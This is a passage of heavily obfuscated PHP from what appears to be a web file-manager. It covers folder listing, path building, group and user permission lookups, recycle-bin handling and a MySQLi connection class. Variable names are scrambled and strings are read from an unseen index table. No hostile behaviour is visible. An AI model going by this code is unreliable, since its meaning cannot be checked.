$¼‘‚æ…ë[$çàÃ¥¬[383]]; } foreach ($â‡ëïÑ as &$ŠÃõµ½½) { $¤—í¾…ª = $ŠÃõµ½½[$çàÃ¥¬[476]]; if (!$¤—í¾…ª || !is_array($¼Ë¶ı§ß[$¤—í¾…ª])) { continue; } $Ì…³¾…† = $¼Ë¶ı§ß[$¤—í¾…ª]; $Ì…³¾…†[$çàÃ¥¬[76]] = $ŠÃõµ½½[$çàÃ¥¬[76]]; $Ì…³¾…†[$çàÃ¥¬[32]] = $ŠÃõµ½½[$çàÃ¥¬[32]]; if (!isset(self::$cacheFileInfo[$çàÃ¥¬[482] . $¤—í¾…ª])) { self::$cacheFileInfo[$çàÃ¥¬[482] . $¤—í¾…ª] = array_merge(array(), $Ì…³¾…†); } unset($¼Ë¶ı§ß[$¤—í¾…ª][$çàÃ¥¬[84]]); $í¨ÌÔ„æ = is_array($™üÊèóí[$¤—í¾…ª]) ? $™üÊèóí[$¤—í¾…ª] : array(); $ŠÃõµ½½[$çàÃ¥¬[170]] = array_merge($í¨ÌÔ„æ, $¼Ë¶ı§ß[$¤—í¾…ª]); if (isset($ŠÃõµ½½[$çàÃ¥¬[170]][$çàÃ¥¬[169]])) { $ŠÃõµ½½[$çàÃ¥¬[169]] = json_decode($ŠÃõµ½½[$çàÃ¥¬[170]][$çàÃ¥¬[169]], !0); unset($ŠÃõµ½½[$çàÃ¥¬[170]][$çàÃ¥¬[169]]); } } unset($ŠÃõµ½½); } protected function _listAppendSourceInfo(&$˜ä´ÂÚ, $…ŒÅÚ¤ë) { $§ŞºÅÆ =& $_SERVER[™¾ÇÙ¯¹]; if (!defined($§ŞºÅÆ[483])) { return; } $¯Ì„ëÄê = Model($§ŞºÅÆ[484])->listData(); $õ‘á²¢Á = Model($§ŞºÅÆ[433])->listData(); $†Ôûœî° = Model($§ŞºÅÆ[423])->listData(); $ñÄŞæÅô = Model($§ŞºÅÆ[485])->listSimple(); $û±…˜ı– = array_to_keyvalue($¯Ì„ëÄê, $§ŞºÅÆ[407]); $‰ÊÖÜ×« = array_to_keyvalue_group($õ‘á²¢Á, $§ŞºÅÆ[84], $§ŞºÅÆ[434]); $¬î—ñõı = array_to_keyvalue($†Ôûœî°, $§ŞºÅÆ[84]); $›—¡ô = array_to_keyvalue_group($ñÄŞæÅô, $§ŞºÅÆ[410]); foreach ($˜ä´ÂÚ as &$éäí²§Å) { $éäí²§Å[$§ŞºÅÆ[86]] = array($§ŞºÅÆ[486] => 0, $§ŞºÅÆ[487] => 0, $§ŞºÅÆ[488] => 0); if (isset($¬î—ñõı[$éäí²§Å[$§ŞºÅÆ[410]]])) { $éäí²§Å[$§ŞºÅÆ[86]][$§ŞºÅÆ[489]] = 1; $éäí²§Å[$§ŞºÅÆ[86]][$§ŞºÅÆ[490]] = $¬î—ñõı[$éäí²§Å[$§ŞºÅÆ[410]]][$§ŞºÅÆ[32]]; } if ($‰ÊÖÜ×« && $û±…˜ı– && isset($‰ÊÖÜ×«[$éäí²§Å[$§ŞºÅÆ[410]]])) { $éäí²§Å[$§ŞºÅÆ[86]][$§ŞºÅÆ[491]] = array(); foreach ($‰ÊÖÜ×«[$éäí²§Å[$§ŞºÅÆ[410]]] as $úğÈÂ) { $òŞĞ‚ï¯ = $û±…˜ı–[$úğÈÂ]; $éäí²§Å[$§ŞºÅÆ[86]][$§ŞºÅÆ[491]][] = array($§ŞºÅÆ[492] => $òŞĞ‚ï¯[$§ŞºÅÆ[407]], $§ŞºÅÆ[428] => $òŞĞ‚ï¯[$§ŞºÅÆ[32]], $§ŞºÅÆ[493] => $òŞĞ‚ï¯[$§ŞºÅÆ[494]]); } } if ($›—¡ô && isset($›—¡ô[$éäí²§Å[$§ŞºÅÆ[410]]])) { $éäí²§Å[$§ŞºÅÆ[86]][$§ŞºÅÆ[495]] = array(); foreach ($›—¡ô[$éäí²§Å[$§ŞºÅÆ[410]]] as $Ã«úŠ¨¢) { $éäí²§Å[$§ŞºÅÆ[86]][$§ŞºÅÆ[495]] = array($§ŞºÅÆ[496] => $Ã«úŠ¨¢[$§ŞºÅÆ[497]], $§ŞºÅÆ[498] => $Ã«úŠ¨¢[$§ŞºÅÆ[499]], $§ŞºÅÆ[500] => $Ã«úŠ¨¢[$§ŞºÅÆ[410]], $§ŞºÅÆ[501] => $Ã«úŠ¨¢[$§ŞºÅÆ[502]], $§ŞºÅÆ[503] => $Ã«úŠ¨¢[$§ŞºÅÆ[504]], $§ŞºÅÆ[505] => $Ã«úŠ¨¢[$§ŞºÅÆ[505]], $§ŞºÅÆ[506] => $Ã«úŠ¨¢[$§ŞºÅÆ[506]]); } } } unset($éäí²§Å); return $˜ä´ÂÚ; } protected function _listAppendChildren(&$½šªúñÅ, $µùÚì“) { $ß‹€º¬² =& $_SERVER[™¾ÇÙ¯¹]; $ı—ï¸Ô’ = array(); $·øİğã = array($ß‹€º¬²[207] => 0, $ß‹€º¬²[208] => 0); foreach ($½šªúñÅ as &$¬ñÆØŞß) { if (!$¬ñÆØŞß[$ß‹€º¬²[418]]) { continue; } $ı—ï¸Ô’[] = $¬ñÆØŞß[$ß‹€º¬²[410]]; } unset($¬ñÆØŞß); if (!$ı—ï¸Ô’) { return; } $Öêòî×é = array($ß‹€º¬²[440] => array($ß‹€º¬²[7], $ı—ï¸Ô’), $ß‹€º¬²[439] => 0); $§°ÄâÕé = array($ß‹€º¬²[440], $ß‹€º¬²[418], $ß‹€º¬²[507] => $ß‹€º¬²[508]); $±Ì©ÎÃ = $this->field($§°ÄâÕé)->where($Öêòî×é)->group($ß‹€º¬²[509])->select(); $ãËÃÜâ³ = array(); foreach ($±Ì©ÎÃ as $¿¤ìé³Ì) { $°¦®ªş· = $¿¤ìé³Ì[$ß‹€º¬²[440]]; $ÃíÆäÄ² = $¿¤ìé³Ì[$ß‹€º¬²[418]] == $ß‹€º¬²[88] ? $ß‹€º¬²[208] : $ß‹€º¬²[207]; if (!isset($ãËÃÜâ³[$°¦®ªş·])) { $ãËÃÜâ³[$°¦®ªş·] = array($ß‹€º¬²[207] => 0, $ß‹€º¬²[208] => 0); } $ãËÃÜâ³[$°¦®ªş·][$ÃíÆäÄ²] += $¿¤ìé³Ì[$ß‹€º¬²[508]]; } foreach ($½šªúñÅ as &$¬ñÆØŞß) { if (!$¬ñÆØŞß[$ß‹€º¬²[418]]) { continue; } $­¯Î×”ú = is_array($ãËÃÜâ³[$¬ñÆØŞß[$ß‹€º¬²[410]]]) ? $ãËÃÜâ³[$¬ñÆØŞß[$ß‹€º¬²[410]]] : $·øİğã; $¬ñÆØŞß[$ß‹€º¬²[208]] = $­¯Î×”ú[$ß‹€º¬²[208]]; $¬ñÆØŞß[$ß‹€º¬²[207]] = $­¯Î×”ú[$ß‹€º¬²[207]]; unset($¬ñÆØŞß[$ß‹€º¬²[420]]); } unset($¬ñÆØŞß); } protected function _listAppendAuth(&$æÁòãË—) { $¢½äø†ô =& $_SERVER[™¾ÇÙ¯¹]; if (!defined($¢½äø†ô[483])) { return; } $ßÀùÎ¾í = array(); foreach ($æÁòãË— as $äó›ˆÎ) { if ($äó›ˆÎ[$¢½äø†ô[419]] == self::TYPE_GROUP) { $ßÀùÎ¾í[] = $äó›ˆÎ[$¢½äø†ô[410]]; } } if (!$ßÀùÎ¾í) { return; } $ÜííÌ§¿ = array_to_keyvalue($æÁòãË—, $¢½äø†ô[410]); $Ş¦ÛœùÌ = Model($¢½äø†ô[510])->getSourceList($ßÀùÎ¾í, $ÜííÌ§¿); $ÖŞ¹Šª˜ = $GLOBALS[$¢½äø†ô[511]] == 1; foreach ($æÁòãË— as $Ÿ›¶‡½‰ => &$äó›ˆÎ) { $äó›ˆÎ[$¢½äø†ô[421]] = $Ş¦ÛœùÌ[$äó›ˆÎ[$¢½äø†ô[410]]]; if (!$äó›ˆÎ[$¢½äø†ô[421]] && $äó›ˆÎ[$¢½äø†ô[419]] == self::TYPE_GROUP) { $äó›ˆÎ[$¢½äø†ô[421]] = Action($¢½äø†ô[512])->pathGroupAuthMake($äó›ˆÎ[$¢½äø†ô[513]]); if (!$äó›ˆÎ[$¢½äø†ô[421]] && !$ÖŞ¹Šª˜) { $äó›ˆÎ[$¢½äø†ô[202]] = !1; $äó›ˆÎ[$¢½äø†ô[201]] = !1; } } if ($äó›ˆÎ[$¢½äø†ô[421]]) { $äó›ˆÎ[$¢½äø†ô[202]] = AuthModel::authCheckEdit($äó›ˆÎ[$¢½äø†ô[421]][$¢½äø†ô[422]]); $äó›ˆÎ[$¢½äø†ô[201]] = AuthModel::authCheckView($äó›ˆÎ[$¢½äø†ô[421]][$¢½äø†ô[422]]); } $this->groupPathDisplay($äó›ˆÎ); } unset($äó›ˆÎ); } public function _listAppendAuthSecret(&$Ú¦†Œ£) { $¿êÆŠù =& $_SERVER[™¾ÇÙ¯¹]; if (Model($¿êÆŠù[443])->get($¿êÆŠù[514]) != $¿êÆŠù[88]) { return; } static $çÎèâÃÚ = false; if (!$çÎèâÃÚ) { $ó¼Ò™Ø· = Model($¿êÆŠù[515]); $–Æ˜‹´ = Model($¿êÆŠù[516]); $çÎèâÃÚ = $–Æ˜‹´->listData(); $çÎèâÃÚ = array_to_keyvalue($çÎèâÃÚ, $¿êÆŠù[410]); $Æıí¥´’ = json_decode(Model($¿êÆŠù[443])->get($¿êÆŠù[517]), !0); $Æıí¥´’ = array_to_keyvalue($Æıí¥´’, $¿êÆŠù[407]); foreach ($çÎèâÃÚ as $®É÷š§• => $Ä¥ôÙê”) { $šòíë£— = $Æıí¥´’[$Ä¥ôÙê”[$¿êÆŠù[518]]]; if (!$šòíë£—) { $–Æ˜‹´->remove($Ä¥ôÙê”[$¿êÆŠù[407]]); unset($çÎèâÃÚ[$®É÷š§•]); continue; } $Ì„…±Ùœ = $ó¼Ò™Ø·->listData($šòíë£—[$¿êÆŠù[421]]); if (!$Ì„…±Ùœ) { $–Æ˜‹´->remove($Ä¥ôÙê”[$¿êÆŠù[407]]); unset($çÎèâÃÚ[$®É÷š§•]); continue; } $Ä¥ôÙê”[$¿êÆŠù[421]] = $Ì„…±Ùœ; $Ä¥ôÙê”[$¿êÆŠù[519]] = $šòíë£—; $Ä¥ôÙê”[$¿êÆŠù[520]] = Model($¿êÆŠù[521])->getInfoSimpleOuter($Ä¥ôÙê”[$¿êÆŠù[462]]); $çÎèâÃÚ[$®É÷š§•] = $Ä¥ôÙê”; } } $ÈÖ–³¸ù = defined($¿êÆŠù[522]) ? USER_ID : $¿êÆŠù[12]; $å´Ÿñ¹ı = array(); $»È»—ƒ = $this->_listAppendPath($å´Ÿñ¹ı, !0); foreach ($Ú¦†Œ£ as $®É÷š§• => &$Ä¥ôÙê”) { if (!is_array($Ä¥ôÙê”[$¿êÆŠù[421]])) { continue; } if ($Ä¥ôÙê”[$¿êÆŠù[419]] != $¿êÆŠù[523]) { continue; } if (isset($çÎèâÃÚ[$Ä¥ôÙê”[$¿êÆŠù[410]]])) { $¢Ü´ô˜ = $çÎèâÃÚ[$Ä¥ôÙê”[$¿êÆŠù[410]]]; if (!is_array($Ä¥ôÙê”[$¿êÆŠù[474]])) { $Ä¥ôÙê”[$¿êÆŠù[474]] = array(); } $Ä¥ôÙê”[$¿êÆŠù[474]][$¿êÆŠù[524]] = $¢Ü´ô˜[$¿êÆŠù[518]]; $Ä¥ôÙê”[$¿êÆŠù[421]][$¿êÆŠù[525]] = $¢Ü´ô˜; $Ä¥ôÙê”[$¿êÆŠù[421]][$¿êÆŠù[526]] = $Ä¥ôÙê”[$¿êÆŠù[527]]; $Ä¥ôÙê”[$¿êÆŠù[421]][$¿êÆŠù[528]] = $¿êÆŠù[88]; if ($¢Ü´ô˜[$¿êÆŠù[462]] != $ÈÖ–³¸ù) { $Ä¥ôÙê”[$¿êÆŠù[421]][$¿êÆŠù[422]] = $Ä¥ôÙê”[$¿êÆŠù[421]][$¿êÆŠù[422]] & $¢Ü´ô˜[$¿êÆŠù[421]][$¿êÆŠù[421]]; } continue; } $“Ğì®„Õ = $this->parentLevelArray($Ä¥ôÙê”[$¿êÆŠù[529]]); $ƒùÄÅÏˆ = array_reverse($“Ğì®„Õ); foreach ($ƒùÄÅÏˆ as $Ãˆ–²×Á => $“øí¾) { if (!isset($çÎèâÃÚ[$“øí¾])) { continue; } $¢Ü´ô˜ = $çÎèâÃÚ[$“øí¾]; $Ä¥ôÙê”[$¿êÆŠù[421]][$¿êÆŠù[525]] = $¢Ü´ô˜; if ($¢Ü´ô˜[$¿êÆŠù[462]] != $ÈÖ–³¸ù) { $Ä¥ôÙê”[$¿êÆŠù[421]][$¿êÆŠù[422]] = $Ä¥ôÙê”[$¿êÆŠù[421]][$¿êÆŠù[422]] & $¢Ü´ô˜[$¿êÆŠù[421]][$¿êÆŠù[421]]; } $äŒ‘Ì”— = $¿êÆŠù[12]; $¿˜ªÍíü = count($“Ğì®„Õ) - $Ãˆ–²×Á; for ($»½Ò®·Á = 0; $»½Ò®·Á < $¿˜ªÍíü; $»½Ò®·Á++) { if (!isset($»È»—ƒ[$“Ğì®„Õ[$»½Ò®·Á]])) { $äŒ‘Ì”— = $¿êÆŠù[12]; break; } $äŒ‘Ì”— = $äŒ‘Ì”— . rtrim($»È»—ƒ[$“Ğì®„Õ[$»½Ò®·Á]], $¿êÆŠù[8]) . $¿êÆŠù[8]; } $Ä¥ôÙê”[$¿êÆŠù[421]][$¿êÆŠù[526]] = rtrim($äŒ‘Ì”—, $¿êÆŠù[8]) . $¿êÆŠù[8]; break; } } unset($Ä¥ôÙê”); } public function groupPathDisplay(&$á¿”ü²®) { $µ¼úÛÃ— =& $_SERVER[™¾ÇÙ¯¹]; if ($á¿”ü²®[$µ¼úÛÃ—[419]] != self::TYPE_GROUP) { return; } $»Å€È„ò = Model($µ¼úÛÃ—[530])->getInfo($á¿”ü²®[$µ¼úÛÃ—[513]]); $™Àß·™ï = $this->parentLevelArray($»Å€È„ò[$µ¼úÛÃ—[529]]); $Ìˆ¤áê = $µ¼úÛÃ—[12]; foreach ($™Àß·™ï as $äìÖÕÓé) { $Ñ™Â‚´ = Model($µ¼úÛÃ—[530])->getInfo($äìÖÕÓé); $Ìˆ¤áê .= $Ñ™Â‚´[$µ¼úÛÃ—[86]][$µ¼úÛÃ—[410]] . $µ¼úÛÃ—[50]; } $á¿”ü²®[$µ¼úÛÃ—[531]] = $»Å€È„ò[$µ¼úÛÃ—[440]]; $á¿”ü²®[$µ¼úÛÃ—[532]] = $»Å€È„ò[$µ¼úÛÃ—[529]]; $á¿”ü²®[$µ¼úÛÃ—[533]] = $»Å€È„ò[$µ¼úÛÃ—[534]]; $á¿”ü²®[$µ¼úÛÃ—[535]] = $Ìˆ¤áê . $»Å€È„ò[$µ¼úÛÃ—[86]][$µ¼úÛÃ—[410]]; } protected function _listAppendPath(&$…ôÇ²Ïë, $Šë¦‹ = false) { $àËÏÏ±¢ =& $_SERVER[™¾ÇÙ¯¹]; static $ÑíÒÌµ† = array(); $ó©´»€ë = array(); $œè…ğª‹ = array(); if ($Šë¦‹) { return $ÑíÒÌµ†; } foreach ($…ôÇ²Ïë as &$ş´ÏÆçë) { $½éï©í = $ş´ÏÆçë[$àËÏÏ±¢[410]]; if ($ş´ÏÆçë[$àËÏÏ±¢[418]] == $àËÏÏ±¢[88] && $ş´ÏÆçë[$àËÏÏ±¢[440]] != 0) { $ÑíÒÌµ†[$½éï©í] = $ş´ÏÆçë[$àËÏÏ±¢[32]]; } if ($ş´ÏÆçë[$àËÏÏ±¢[418]] == $àËÏÏ±¢[88] && $ş´ÏÆçë[$àËÏÏ±¢[440]] == 0 && !isset($ÑíÒÌµ†[$½éï©í])) { $ÑíÒÌµ†[$½éï©í] = $this->_listAppendPathRoot($ş´ÏÆçë, array()); } if (isset($œè…ğª‹[$ş´ÏÆçë[$àËÏÏ±¢[529]]])) { continue; } $œè…ğª‹[$ş´ÏÆçë[$àËÏÏ±¢[529]]] = !0; $±Ğºà¸ = $this->parentLevelArray($ş´ÏÆçë[$àËÏÏ±¢[529]]); foreach ($±Ğºà¸ as $ßøî® => $™µçÇË˜) { if (isset($ÑíÒÌµ†[$™µçÇË˜])) { continue; } if ($ßøî® == 0) { $ÑíÒÌµ†[$™µçÇË˜] = $this->_listAppendPathRoot($ş´ÏÆçë, $±Ğºà¸); } if ($ßøî® != 0) { $ó©´»€ë[] = $™µçÇË˜; } } } unset($ş´ÏÆçë); $ó©´»€ë = array_unique($ó©´»€ë); if (count($ó©´»€ë) > 0) { $æ‡³äŠ = array($àËÏÏ±¢[425] => array($àËÏÏ±¢[426], $ó©´»€ë)); if (count($ó©´»€ë) == 1) { $‘ƒå°¥Ÿ = $this->sourceInfo($ó©´»€ë[0]); $ÁË‰ñÈ¼ = is_array($‘ƒå°¥Ÿ) ? array($‘ƒå°¥Ÿ) : !1; } else { $ÁË‰ñÈ¼ = $this->field($àËÏÏ±¢[536])->where($æ‡³äŠ)->select(); } if (!$ÁË‰ñÈ¼) { $ÁË‰ñÈ¼ = array(); } foreach ($ÁË‰ñÈ¼ as $µù±Ø…Ÿ) { $ÑíÒÌµ†[$µù±Ø…Ÿ[$àËÏÏ±¢[410]]] = $µù±Ø…Ÿ[$àËÏÏ±¢[32]]; } } $éäÜ›ÙĞ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ÅüÂšÖ¯ = array(); foreach ($…ôÇ²Ïë as &$ş´ÏÆçë) { $÷–Ÿƒ” = $ş´ÏÆçë[$àËÏÏ±¢[529]]; $çª……™Ä = $àËÏÏ±¢[12]; if (isset($ÅüÂšÖ¯[$÷–Ÿƒ”])) { $çª……™Ä = $ÅüÂšÖ¯[$÷–Ÿƒ”]; } else { $±Ğºà¸ = $this->parentLevelArray($ş´ÏÆçë[$àËÏÏ±¢[529]]); foreach ($±Ğºà¸ as $ßøî® => $™µçÇË˜) { if (isset($ÑíÒÌµ†[$™µçÇË˜])) { $çª……™Ä .= $ÑíÒÌµ†[$™µçÇË˜] . $àËÏÏ±¢[8]; } } $ÅüÂšÖ¯[$÷–Ÿƒ”] = $çª……™Ä; } $çª……™Ä .= $ş´ÏÆçë[$àËÏÏ±¢[32]]; if ($ş´ÏÆçë[$àËÏÏ±¢[418]] == $àËÏÏ±¢[88]) { $çª……™Ä .= $àËÏÏ±¢[8]; } $ş´ÏÆçë[$àËÏÏ±¢[527]] = str_replace($àËÏÏ±¢[537], $àËÏÏ±¢[8], $çª……™Ä); if ($ş´ÏÆçë[$àËÏÏ±¢[440]] == $àËÏÏ±¢[197]) { $ş´ÏÆçë[$àËÏÏ±¢[32]] = trim($ÑíÒÌµ†[$ş´ÏÆçë[$àËÏÏ±¢[410]]], $àËÏÏ±¢[8]); $ş´ÏÆçë[$àËÏÏ±¢[527]] = $ş´ÏÆçë[$àËÏÏ±¢[32]] . $àËÏÏ±¢[8]; } if (intval($ş´ÏÆçë[$àËÏÏ±¢[419]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ş´ÏÆçë, $±Ğºà¸, $éäÜ›ÙĞ); } } unset($ş´ÏÆçë); return $…ôÇ²Ïë; } private function _listAppendPathRecycle(&$ıãÎÆ¦â, $°¶ì’á¶, $¯¨ÂêŞÀ) { $¾ãÎùÀ¹ =& $_SERVER[™¾ÇÙ¯¹]; if (!in_array($¯¨ÂêŞÀ, $°¶ì’á¶) && $ıãÎÆ¦â[$¾ãÎùÀ¹[410]] != $¯¨ÂêŞÀ) { return; } $àé›ƒ–÷ = explode($¾ãÎùÀ¹[8], trim($ıãÎÆ¦â[$¾ãÎùÀ¹[527]], $¾ãÎùÀ¹[8])); $’…Ä½¦Ô = implode($¾ãÎùÀ¹[8], array_slice($àé›ƒ–÷, 2)); $ıãÎÆ¦â[$¾ãÎùÀ¹[527]] = $¾ãÎùÀ¹[8] . LNG($¾ãÎùÀ¹[538]) . $¾ãÎùÀ¹[8] . ltrim($’…Ä½¦Ô, $¾ãÎùÀ¹[8]); $ıãÎÆ¦â[$¾ãÎùÀ¹[529]] = $¾ãÎùÀ¹[539] . implode($¾ãÎùÀ¹[50], array_slice($°¶ì’á¶, 1)) . $¾ãÎùÀ¹[50]; if ($ıãÎÆ¦â[$¾ãÎùÀ¹[410]] == $¯¨ÂêŞÀ) { $ıãÎÆ¦â[$¾ãÎùÀ¹[529]] = $¾ãÎùÀ¹[539]; $ıãÎÆ¦â[$¾ãÎùÀ¹[440]] = $¾ãÎùÀ¹[197]; $ıãÎÆ¦â[$¾ãÎùÀ¹[32]] = LNG($¾ãÎùÀ¹[538]); } $ıãÎÆ¦â[$¾ãÎùÀ¹[540]] = $¾ãÎùÀ¹[541]; } protected function _listAppendPathRoot(&$€®Ö¹º”, $ì„íÊµœ) { $²—ÛÊêÈ =& $_SERVER[™¾ÇÙ¯¹]; static $—°Ö­ŸŠ = false; $¦Ò¯ñ» = $²—ÛÊêÈ[12]; if ($€®Ö¹º”[$²—ÛÊêÈ[419]] == self::TYPE_USER) { if (defined($²—ÛÊêÈ[483]) && $€®Ö¹º”[$²—ÛÊêÈ[513]] == USER_ID) { $¦Ò¯ñ» = LNG($²—ÛÊêÈ[542]); if ($—°Ö­ŸŠ === !1) { $‚ŸËÆ•° = Model($²—ÛÊêÈ[543])->getInfoFull(USER_ID); $—°Ö­ŸŠ = _get($‚ŸËÆ•°, $²—ÛÊêÈ[544], $²—ÛÊêÈ[12]); } if ($ì„íÊµœ && $ì„íÊµœ[0] == $—°Ö­ŸŠ || !$ì„íÊµœ && $€®Ö¹º”[$²—ÛÊêÈ[410]] == $—°Ö­ŸŠ) { $¦Ò¯ñ» = LNG($²—ÛÊêÈ[545]); $€®Ö¹º”[$²—ÛÊêÈ[546]] = $²—ÛÊêÈ[547]; } if (!$ì„íÊµœ) { $€®Ö¹º”[$²—ÛÊêÈ[32]] = $¦Ò¯ñ»; } } else { $±˜¥·˜Å = Model($²—ÛÊêÈ[521])->getInfoSimple($€®Ö¹º”[$²—ÛÊêÈ[513]]); $¦Ò¯ñ» = LNG($²—ÛÊêÈ[548]) . $²—ÛÊêÈ[162] . $±˜¥·˜Å[$²—ÛÊêÈ[32]] . $²—ÛÊêÈ[164]; $€®Ö¹º”[$²—ÛÊêÈ[549]] = array($²—ÛÊêÈ[32] => $±˜¥·˜Å[$²—ÛÊêÈ[32]], $²—ÛÊêÈ[550] => $±˜¥·˜Å[$²—ÛÊêÈ[550]], $²—ÛÊêÈ[551] => $±˜¥·˜Å[$²—ÛÊêÈ[551]]); } } else { if ($€®Ö¹º”[$²—ÛÊêÈ[419]] == self::TYPE_GROUP) { $±˜¥·˜Å = Model($²—ÛÊêÈ[530])->getInfoSimple($€®Ö¹º”[$²—ÛÊêÈ[513]]); $¦Ò¯ñ» = $±˜¥·˜Å[$²—ÛÊêÈ[32]]; } else { if ($€®Ö¹º”[$²—ÛÊêÈ[419]] == self::TYPE_SYSTEM) { $¦Ò¯ñ» = $²—ÛÊêÈ[552]; } } } $¦Ò¯ñ» = $¦Ò¯ñ» ? $²—ÛÊêÈ[8] . $¦Ò¯ñ» . $²—ÛÊêÈ[8] : $²—ÛÊêÈ[8]; return $¦Ò¯ñ»; } protected function _listAppendUser(&$äÖÉÄÜË) { $§×ıîù¤ =& $_SERVER[™¾ÇÙ¯¹]; $şÀãƒŸ = array_to_keyvalue($äÖÉÄÜË, $§×ıîù¤[12], $§×ıîù¤[462]); $®…ô¸ë¹ = array_to_keyvalue($äÖÉÄÜË, $§×ıîù¤[12], $§×ıîù¤[464]); $Ï¥æøØº = array_merge($şÀãƒŸ, $®…ô¸ë¹); $É¹¿ÙÁî = Model($§×ıîù¤[543])->userListInfo($Ï¥æøØº); foreach ($äÖÉÄÜË as &$şµª¾°¡) { $¬ë¼Š = $şµª¾°¡[$§×ıîù¤[462]]; $şµª¾°¡[$§×ıîù¤[462]] = $É¹¿ÙÁî[$¬ë¼Š] ? $É¹¿ÙÁî[$¬ë¼Š] : !1; $¬ë¼Š = $şµª¾°¡[$§×ıîù¤[464]]; $şµª¾°¡[$§×ıîù¤[464]] = $É¹¿ÙÁî[$¬ë¼Š] ? $É¹¿ÙÁî[$¬ë¼Š] : !1; if (isset($şµª¾°¡[$§×ıîù¤[474]]) && $şµª¾°¡[$§×ıîù¤[474]][$§×ıîù¤[553]]) { $û±áÍŞ = $GLOBALS[$§×ıîù¤[6]][$§×ıîù¤[89]][$§×ıîù¤[554]]; if ($şµª¾°¡[$§×ıîù¤[474]][$§×ıîù¤[555]] <= time() - $û±áÍŞ) { $this->metaSet($şµª¾°¡[$§×ıîù¤[410]], $§×ıîù¤[553], null); $this->metaSet($şµª¾°¡[$§×ıîù¤[410]], $§×ıîù¤[555], null); unset($şµª¾°¡[$§×ıîù¤[474]][$§×ıîù¤[553]]); continue; } $›Í³Íì = $şµª¾°¡[$§×ıîù¤[474]][$§×ıîù¤[553]]; $şµª¾°¡[$§×ıîù¤[474]][$§×ıîù¤[556]] = Model($§×ıîù¤[543])->getInfoSimpleOuter($›Í³Íì); } } unset($şµª¾°¡); } public function parentLevelArray($‰˜±–Èì) { $Æª³‹¹Í =& $_SERVER[™¾ÇÙ¯¹]; $‰˜±–Èì = explode($Æª³‹¹Í[50], trim($‰˜±–Èì, $Æª³‹¹Í[50])); return array_remove_value($‰˜±–Èì, $Æª³‹¹Í[197]); } public function listAll($½ˆ©æß) { $µ½ŸëÈÖ =& $_SERVER[™¾ÇÙ¯¹]; $ØÙÉÔâº = $this->sourceInfo($½ˆ©æß); $¦Ú½ÆÁ€ = array($µ½ŸëÈÖ[557] => array($µ½ŸëÈÖ[558], $ØÙÉÔâº[$µ½ŸëÈÖ[529]] . $½ˆ©æß . $µ½ŸëÈÖ[559]), $µ½ŸëÈÖ[560] => 0); $°èìó¿˜ = $µ½ŸëÈÖ[561]; $Æâ´±ÊÀ = "\114\x45\106\x54\x20\112\x4f\x49\x4e\x20{$this->tablePrefix}\x69\157\137\x66\x69\154\x65\40\146\151\154\145\x20\x6f\x6e\x20\163\x6f\165\162\143\145\x2e\x66\x69\154\x65\111\104\40\x3d\40\x66\151\154\145\x2e\x66\151\154\145\111\104"; $©ÑÙ ™« = $this->alias($µ½ŸëÈÖ[454])->field($°èìó¿˜)->where($¦Ú½ÆÁ€)->join($Æâ´±ÊÀ)->select(); $this->_listAppendAuth($©ÑÙ ™«); $this->_listAppendUser($©ÑÙ ™«); $this->_listAppendPath($©ÑÙ ™«); $©ÑÙ ™« = array_to_keyvalue($©ÑÙ ™«, $µ½ŸëÈÖ[410]); $¹¶‰‡ğ‰ = "\57{$ØÙÉÔâº[$µ½ŸëÈÖ[32]]}\57"; $¹¶‰‡ğ‰ = $¹¶‰‡ğ‰ == $µ½ŸëÈÖ[537] ? $µ½ŸëÈÖ[8] : $¹¶‰‡ğ‰; $åáÛåÏ™ = array(); foreach ($©ÑÙ ™« as $ü§ÁÍÈú => $‘˜×ôø³) { $ºÚ®œü× = $this->parentLevelArray($‘˜×ôø³[$µ½ŸëÈÖ[529]]); array_shift($ºÚ®œü×); $³ËÈÇá‹ = $¹¶‰‡ğ‰; for ($¤Ó¬§²¸ = 0; $¤Ó¬§²¸ < count($ºÚ®œü×); $¤Ó¬§²¸++) { $³ËÈÇá‹ .= $©ÑÙ ™«[$ºÚ®œü×[$¤Ó¬§²¸]][$µ½ŸëÈÖ[32]] . $µ½ŸëÈÖ[8]; } $³ËÈÇá‹ .= $‘˜×ôø³[$µ½ŸëÈÖ[32]]; if ($‘˜×ôø³[$µ½ŸëÈÖ[418]]) { $³ËÈÇá‹ .= $µ½ŸëÈÖ[8]; } $³ËÈÇá‹ = str_replace($µ½ŸëÈÖ[537], $µ½ŸëÈÖ[8], $³ËÈÇá‹); $³ËÈÇá‹ = str_replace($µ½ŸëÈÖ[537], $µ½ŸëÈÖ[8], $³ËÈÇá‹); $ù¹óµÑ = array($µ½ŸëÈÖ[429] => str_replace($µ½ŸëÈÖ[537], $µ½ŸëÈÖ[8], $³ËÈÇá‹), $µ½ŸëÈÖ[562] => intval($‘˜×ôø³[$µ½ŸëÈÖ[418]]), $µ½ŸëÈÖ[86] => $this->pathInfoFilter($‘˜×ôø³)); if (!$‘˜×ôø³[$µ½ŸëÈÖ[418]]) { $ù¹óµÑ[$µ½ŸëÈÖ[476]] = $‘˜×ôø³[$µ½ŸëÈÖ[476]]; $ù¹óµÑ[$µ½ŸëÈÖ[87]] = $‘˜×ôø³[$µ½ŸëÈÖ[84]]; } $åáÛåÏ™[] = $ù¹óµÑ; } return $åáÛåÏ™; } } goto b‰»µÅ‰‘; b½‰À±ªßâ: class DbMysqli extends Db { public function __construct($ëÉ—®æÍ = '') { $Şİ¾ûÌ€ =& $_SERVER[™¾ÇÙ¯¹]; if (!extension_loaded($Şİ¾ûÌ€[920])) { think_exception(think_lang($Şİ¾ûÌ€[14]) . $Şİ¾ûÌ€[921]); } if (!empty($ëÉ—®æÍ)) { $this->config = $ëÉ—®æÍ; if (empty($this->config[$Şİ¾ûÌ€[17]])) { $this->config[$Şİ¾ûÌ€[17]] = $Şİ¾ûÌ€[12]; } } } public function connect($Øã·å®ù = '', $¦±ºîö° = 0) { $ñÚÓ²á« =& $_SERVER[™¾ÇÙ¯¹]; if (!isset($this->linkID[$¦±ºîö°])) { if (empty($Øã·å®ù)) { $Øã·å®ù = $this->config; } $this->linkID[$¦±ºîö°] = new mysqli($Øã·å®ù[$ñÚÓ²á«[894]], $Øã·å®ù[$ñÚÓ²á«[896]], $Øã·å®ù[$ñÚÓ²á«[897]], $Øã·å®ù[$ñÚÓ²á«[21]], $Øã·å®ù[$ñÚÓ²á«[895]] ? intval($Øã·å®ù[$ñÚÓ²á«[895]]) : 3306); if (mysqli_connect_errno()) { 